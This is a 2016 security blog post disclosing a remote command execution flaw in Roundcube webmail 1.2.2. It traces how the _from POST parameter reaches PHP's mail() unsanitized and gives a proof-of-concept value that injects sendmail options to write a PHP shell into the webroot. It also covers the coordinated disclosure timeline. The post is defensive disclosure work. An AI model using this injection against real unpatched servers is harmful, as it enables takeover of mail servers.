# Roundcube 1.2.2: Command Execution via Email

6 Dec 2016 by Robin Peraglie

[Roundcube](https://www.roundcube.net/) is a widely distributed open-source webmail software
used by many organizations and companies around the globe. In this post,
we show how a malicious user can remotely execute arbitrary commands on
the underlying operating system, simply by writing an email in Roundcube
1.2.2 (\>= 1.0). This vulnerability is **highly critical** because all
default installations are affected.


The mirror on SourceForge counts [more than 260,000 downloads for
Roundcube in the last 12 months](https://sourceforge.net/projects/roundcubemail/files/stats/timeline?dates=2015-12-01+to+2016-12-01) which is only a small
fraction of the actual users. Once Roundcube is installed on a server,
it provides a web interface for authenticated users to send and receive
emails with their web browser.

## RIPS Analysis

It took RIPS exactly 25 seconds to fully analyze the whole application
and to detect the security vulnerabilities shown in the charts above.
Although it seems that the issues come in numbers, many of them turned
out to be less severe because they were parts of the installation module
or of dead legacy code. Regardless, it is adviced to also fix these
vulnerabilities and to remove the dead code in order to prevent future
unsafe use or combinations with other security bugs, as demonstrated in
earlier posts of our advent calendar.

## Requirements

The vulnerability has the following requirements for exploitation:

-   Roundcube must be configured to use PHP's `mail()` function ([by
    default, *if no SMTP was specified*](https://github.com/roundcube/roundcubemail/wiki/Configuration#sending-messages-via-smtp))
-   PHP's `mail()` function is configured to use sendmail ([by default,
    see *sendmail_path*](http://php.net/manual/en/mail.configuration.php))
-   PHP is configured to have `safe_mode` turned off ([by default, see
    *safe_mode*](http://php.net/manual/en/ini.sect.safe-mode.php))
-   An attacker must know or guess the absolute path of the webroot

These requirements are not particular demanding which in turn means that
there were a lot of vulnerable systems in the wild.

## Description

In Roundcube 1.2.2 and earlier, user-controlled input flows unsanitized
into the fifth argument of a call to PHP's built-in function `mail()`
which is documented as
[critical](https://www.saotn.org/exploit-phps-mail-get-remote-code-execution/) in terms of security. The problem is that the
invocation of the `mail()` function will cause PHP to execute the
sendmail program. The fifth argument allows passing additional
parameters to this execution which allows a configuration of sendmail.
Since sendmail offers the `-X` option to log all mail traffic in a file,
an attacker can abuse this option and spawn a malicious PHP file in the
webroot directory of the attacked server. Although this vulnerability is
rare and not widely known, RIPS detected it within seconds. The
following code lines trigger the vulnerability.

```php
$from = rcube_utils::get_input_value('_from', rcube_utils::INPUT_POST, true, $message_charset);
⋮
$sent = $RCMAIL->deliver_message($MAIL_MIME, $from, $mailto,$smtp_error, $mailbody_file, $smtp_opts);
```

Here, the value of the POST parameter `_from` is fetched and Roundcube's
`deliver_message()` method is invoked with the value used as second
argument `$from`.

```php
public function deliver_message(&$message, $from, $mailto, &$error, &$body_file = null, $options = null) {
    ⋮
    if (filter_var(ini_get('safe_mode'), FILTER_VALIDATE_BOOLEAN))
        $sent = mail($to, $subject, $msg_body, $header_str);
    else
        $sent = mail($to, $subject, $msg_body, $header_str, "-f$from");
```

This method will then pass the `$from` parameter to a call of the
`mail()` function. The idea is to pass a custom `from` header to the
sendmail program via the `-f` option.

### Insufficient Sanitization

An interesting part is that it seems as if the `from` e-mail address is
filtered beforehand with a regular expression. Basically, the `$from`
parameter is expected to have no whitespaces which would limit the
possibility to attach other parameters behind the `-f` parameter. Using
whitespace constants such as `$IFS` or injecting new shell commands
``  ` `` does not succeed at this point. However, there is a logical
flaw in the application that causes the sanitization to fail.

```php
else if ($from_string = rcmail_email_input_format($from)) {
    if (preg_match(&#39;/(\S+@\S+)/&#39;, $from_string, $m))
        $from = trim($m[1], &#39;<>&#39;);
    else
        $from = null;
}
```

In line 105, an email is extracted from the user-controlled variable
`$from` that contains no whitespaces. However, this extraction only
takes place when the `rcmail_email_input_format()` function returns a
value equivalent to TRUE. In the following, we will examine this
function closely.

```php
function rcmail_email_input_format($mailto, $count=false, $check=true)
{
    global $RCMAIL, $EMAIL_FORMAT_ERROR, $RECIPIENT_COUNT;
    // simplified email regexp, supporting quoted local part
    $email_regexp = &#39;(\S+|(&#34;[^&#34;]+&#34;))@\S+&#39;;
    ⋮
    // replace new lines and strip ending &#39;, &#39;, make address input more valid
    $mailto = trim(preg_replace($regexp, $replace, $mailto));
    $items  = rcube_utils::explode_quoted_string($delim, $mailto);
    $result = array();
    foreach ($items as $item) {
        $item = trim($item);
        // address in brackets without name (do nothing)
        if (preg_match(&#39;/^<&#39;.$email_regexp.&#39;>$/&#39;, $item)) {
            $item     = rcube_utils::idn_to_ascii(trim($item, &#39;<>&#39;));
            $result[] = $item;
        }
        ⋮
        else if (trim($item)) {
            continue;
        }
        ⋮
    }
    if ($count) {
        $RECIPIENT_COUNT += count($result);
    }
    return implode(&#39;, &#39;, $result);
}
```

The function uses another regular expression in line 863 which requires
that the line ends (`$`) right after the email match. A payload used by
an attacker does not have to match this regex and therefore the array
`$result` will stay empty after the `foreach` loop. In this case, the
`implode()` function in line 876 will return an empty string (equal to
FALSE) and the `$from` variable is **not** altered nor sanitized.

## Proof of Concept

When an email is sent with Roundcube, the HTTP request can be
intercepted and altered. Here, the `_from` parameter can be modified in
order to place a malicious PHP file on the file system.

```
example@example.com -OQueueDirectory=/tmp -X/var/www/html/rce.php
```

This allows an attacker to spawn a shell file *rce.php* in the web root
directory with the contents of the `_subject` parameter that can contain
PHP code. After performing the request, a file with the following
content is created:

```
04731 >>> "Recipient names must be specified"
04731 <<< To: squinty@localhost
04731 <<< Subject: <?php phpinfo(); ?>
04731 <<< X-PHP-Originating-Script: 1000:rcube.php
04731 <<< MIME-Version: 1.0
04731 <<< Content-Type: text/plain; charset=US-ASCII;
04731 <<<  format=flowed
04731 <<< Content-Transfer-Encoding: 7bit
04731 <<< Date: So, 20 Nov 2016 04:02:52 +0100
04731 <<< From: example@example.com -OQueueDirectory=/tmp
04731 <<<  -X/var/www/html/rce.php
04731 <<< Message-ID: <390a0c6379024872a7f0310cdea24900@localhost>
04731 <<< X-Sender: example@example.com -OQueueDirectory=/tmp
04731 <<<  -X/var/www/html/rce.php
04731 <<< User-Agent: Roundcube Webmail/1.2.2
04731 <<<
04731 <<< Funny e-mail message
04731 <<< [EOF]
```

Since the email data is unencoded, the subject parameter will be
reflected in plaintext which allows the injection of PHP tags into the
shell file.

## Time Line

| Date | What |
|------|------|
| 2016/11/21 | First contact with vendor |
| 2016/11/22 | [Vendor fixes vulnerability on GitHub](https://github.com/roundcube/roundcubemail/commit/f84233785ddeed01445fc855f3ae1e8a62f167e1) |
| 2016/11/28 | Vendor agrees to coordinated disclosure |
| 2016/11/28 | [Vendor releases updated version Roundcube 1.2.3](https://roundcube.net/news/2016/11/28/updates-1.2.3-and-1.1.7-released) |

## Summary

Roundcube 1.2.2 is resistant against many attack vectors and a large
community works on the software continuously together securing the
application. However, the vulnerability described in this post could
slip through and is an edge-case due to its rarity. With the aid of
automated testing, it is not only possible to detect such edge-cases,
but it allows to save human resources and therefore focus on different
aspects in the development process of a secure web application.

We would like to thank the Roundcube team for the very quick fix after
just one day, and the new release made available only after one week!
This is a very impressive and professional response towards security
issues.
